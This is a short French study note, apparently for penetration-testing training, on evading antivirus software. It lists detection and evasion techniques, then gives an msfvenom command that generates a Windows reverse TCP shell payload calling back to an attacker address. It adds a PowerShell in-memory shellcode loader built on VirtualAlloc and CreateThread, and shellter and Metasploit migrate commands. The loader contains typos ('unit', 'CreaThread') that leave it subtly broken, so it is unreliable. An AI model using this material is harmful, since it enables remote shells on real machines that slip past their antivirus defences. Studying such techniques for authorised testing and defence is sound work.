# AV Evasion
Type de dectection:
- Signature-Based Detection
- Heuristic-Based Detection
---

On-Disk evasion 
Les techniques utiliser pour obfusquer les fichiers malveillant stocker sur la machine
- Packers
- Obfuscators
- Crypters
- Software Protectors

In-Memory evasion
Les techniques pour bypasser l'anti-virus
- Remote Process Memory Injection
- Reflective DLL Injection
- Process Hollowing
- Inline Hooking

`PSHIn-memoryInjection.ps1`

```sh
msfvenom --platform windows -a x64 -p windows/x64/shell_reverse_tcp LPORT=9001 LHOST=192.168.45.128 -f powershell
```

```c
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, unit dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreaThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
	Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]]
[Byte[]]$sc = "place your shellcode here"

$size = 0x1000

if ($sc.Length -gt 0x1000) { $size = $sc.Length };

$x = $winFunc::VirtualAlloc(0, $size, 0x3000, 0x40);

for ($i = 0; $i -le ($sc.Length - 1); $i++) { $winFunc::memset([IntPtr]($x.ToInt32()+ $i), $sc[$i], 1) };

$winFunc::CreaThread(0,0,$x,0,0,0); for(;;) { Start-sleep 60 };
```

---
Utiliser shellter

```
sudo apt install shellter
```

```
msf> set AutoRunScript post/windows/manage/migrate
```